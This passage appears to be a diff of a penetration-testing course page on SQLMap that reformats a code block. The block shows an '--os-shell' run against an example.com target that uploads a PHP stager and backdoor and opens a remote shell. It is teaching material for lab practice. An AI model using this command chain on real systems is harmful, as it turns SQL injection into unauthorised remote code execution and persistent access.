@@ -2062,12 +2062,64 @@ No output
 We see that SQLMap defaulted to `UNION` technique to get an OS shell, but eventually failed to give us any output `No output`. So, as we already know we have multiple types of SQL injection vulnerabilities, let's try to specify another technique that has a better chance of giving us direct output, like the `Error-based SQL Injection`, which we can specify with `--technique=E`:
 
 ```shell
-`adampueman@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --os-shell --technique=E         ___       __H__ ___ ___[,]_____ ___ ___  {1.4.11#stable} |_ -| . [,]     | .'| . | |___|_  [(]_|_|_|__,|  _|       |_|V...       |_|   http://sqlmap.org [*] starting @ 18:05:59 /2020-11-19/ [18:05:59] [INFO] resuming back-end DBMS 'mysql' [18:05:59] [INFO] testing connection to the target URL sqlmap resumed the following injection point(s) from stored session: ...SNIP... which web application language does the web server support? [1] ASP [2] ASPX [3] JSP [4] PHP (default) > 4 do you want sqlmap to further try to provoke the full path disclosure? [Y/n] y [18:06:07] [WARNING] unable to automatically retrieve the web server document root what do you want to use for writable directory? [1] common location(s) ('/var/www/, /var/www/html, /var/www/htdocs, /usr/local/apache2/htdocs, /usr/local/www/data, /var/apache2/htdocs, /var/www/nginx-default, /srv/www/htdocs') (default) [2] custom location(s) [3] custom directory list file [4] brute force search > 1 [18:06:09] [WARNING] unable to automatically parse any web server path [18:06:09] [INFO] trying to upload the file stager on '/var/www/' via LIMIT 'LINES TERMINATED BY' method [18:06:09] [WARNING] potential permission problems detected ('Permission denied') [18:06:10] [WARNING] unable to upload the file stager on '/var/www/' [18:06:10] [INFO] trying to upload the file stager on '/var/www/html/' via LIMIT 'LINES TERMINATED BY' method [18:06:11] [INFO] the file stager has been successfully uploaded on '/var/www/html/' - http://www.example.com/tmpumgzr.php [18:06:11] [INFO] the backdoor has been successfully uploaded on '/var/www/html/' - http://www.example.com/tmpbznbe.php [18:06:11] [INFO] calling OS shell. To quit type 'x' or 'q' and press ENTER os-shell> ls -la do you want to retrieve the command standard output? [Y/n/a] a command standard output: --- total 156 drwxrwxrwt 1 www-data www-data   4096 Nov 19 18:06 . drwxr-xr-x 1 www-data www-data   4096 Nov 19 08:15 .. -rw-rw-rw- 1 mysql    mysql       188 Nov 19 07:39 basic.php ...SNIP...`
+adampueman@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --os-shell --technique=E
+
+        ___
+       __H__
+ ___ ___[,]_____ ___ ___  {1.4.11#stable}
+|_ -| . [,]     | .'| . |
+|___|_  [(]_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+
+[*] starting @ 18:05:59 /2020-11-19/
+
+[18:05:59] [INFO] resuming back-end DBMS 'mysql'
+[18:05:59] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+...SNIP...
+which web application language does the web server support?
+[1] ASP
+[2] ASPX
+[3] JSP
+[4] PHP (default)
+> 4
+
+do you want sqlmap to further try to provoke the full path disclosure? [Y/n] y
+
+[18:06:07] [WARNING] unable to automatically retrieve the web server document root
+what do you want to use for writable directory?
+[1] common location(s) ('/var/www/, /var/www/html, /var/www/htdocs, /usr/local/apache2/htdocs, /usr/local/www/data, /var/apache2/htdocs, /var/www/nginx-default, /srv/www/htdocs') (default)
+[2] custom location(s)
+[3] custom directory list file
+[4] brute force search
+> 1
+
+[18:06:09] [WARNING] unable to automatically parse any web server path
+[18:06:09] [INFO] trying to upload the file stager on '/var/www/' via LIMIT 'LINES TERMINATED BY' method
+[18:06:09] [WARNING] potential permission problems detected ('Permission denied')
+[18:06:10] [WARNING] unable to upload the file stager on '/var/www/'
+[18:06:10] [INFO] trying to upload the file stager on '/var/www/html/' via LIMIT 'LINES TERMINATED BY' method
+[18:06:11] [INFO] the file stager has been successfully uploaded on '/var/www/html/' - http://www.example.com/tmpumgzr.php
+[18:06:11] [INFO] the backdoor has been successfully uploaded on '/var/www/html/' - http://www.example.com/tmpbznbe.php
+[18:06:11] [INFO] calling OS shell. To quit type 'x' or 'q' and press ENTER
+
+os-shell> ls -la
+
+do you want to retrieve the command standard output? [Y/n/a] a
+
+command standard output:
+---
+total 156
+drwxrwxrwt 1 www-data www-data   4096 Nov 19 18:06 .
+drwxr-xr-x 1 www-data www-data   4096 Nov 19 08:15 ..
+-rw-rw-rw- 1 mysql    mysql       188 Nov 19 07:39 basic.php
+...SNIP...
 ```
 
 As we can see, this time SQLMap successfully dropped us into an easy interactive remote shell, giving us easy remote code execution through this SQLi.
 
-Note: SQLMap first asked us for the type of language used on this remote server, which we know is PHP. Then it asked us for the server web root directory, and we asked SQLMap to automatically find it using 'common location(s)'. Both of these options are the default options, and would have been automatically chosen if we added the '--batch' option to SQLMap.
+> Note: SQLMap first asked us for the type of language used on this remote server, which we know is PHP. Then it asked us for the server web root directory, and we asked SQLMap to automatically find it using 'common location(s)'. Both of these options are the default options, and would have been automatically chosen if we added the '--batch' option to SQLMap.
 
 With this, we have covered all of the main functionality of SQLMap.
 
